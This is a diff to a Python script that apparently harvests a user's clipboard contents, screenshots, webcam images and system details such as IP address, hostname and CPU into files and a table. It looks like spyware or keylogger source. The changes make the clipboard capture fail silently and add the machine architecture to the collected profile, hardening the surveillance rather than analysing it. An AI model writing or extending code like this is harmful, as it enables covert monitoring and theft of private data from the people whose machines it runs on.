@@ -34,13 +34,16 @@ def screenshot():
 def clipboard_copy():
 	curr_date = datetime.datetime.now()
 	with open("clipboard_text.txt", "a") as fil:
-		win32clipboard.OpenClipboard()
-		paste_data = win32clipboard.GetClipboardData()
-		win32clipboard.CloseClipboard()
+		try:
+			win32clipboard.OpenClipboard()
+			paste_data = win32clipboard.GetClipboardData()
+			win32clipboard.CloseClipboard()
 
-		fil.write("\n")
-		fil.write("date and time:" + str(curr_date) + "\n")
-		fil.write("Clipboard Data:"+paste_data)
+			fil.write("\n")
+			fil.write("date and time:" + str(curr_date) + "\n")
+			fil.write("Clipboard Data:"+paste_data)
+		except:
+			fil.write("Can't copy clipboard \n")
 
 def capture_camera():
     cam = VideoCapture(0)
@@ -63,10 +66,11 @@ cpu = platform.processor()
 sys = platform.system()
 host_name = socket.gethostname()
 version = platform.release()
+machine = platform.machine()
 
 data = { 
-	'Metric': ['Date','IP Address', 'CPU', 'System & Version', 'Host Name'],
-    'Value': [date,ip_addr, cpu, sys + " " + version, host_name]
+	'Metric': ['Date','IP Address', 'CPU', 'System & Version', 'Host Name', 'Machine'],
+    'Value': [date,ip_addr, cpu, sys + " " + version, host_name, machine]
 }
 
 dataFrame = pandas.DataFrame(data)
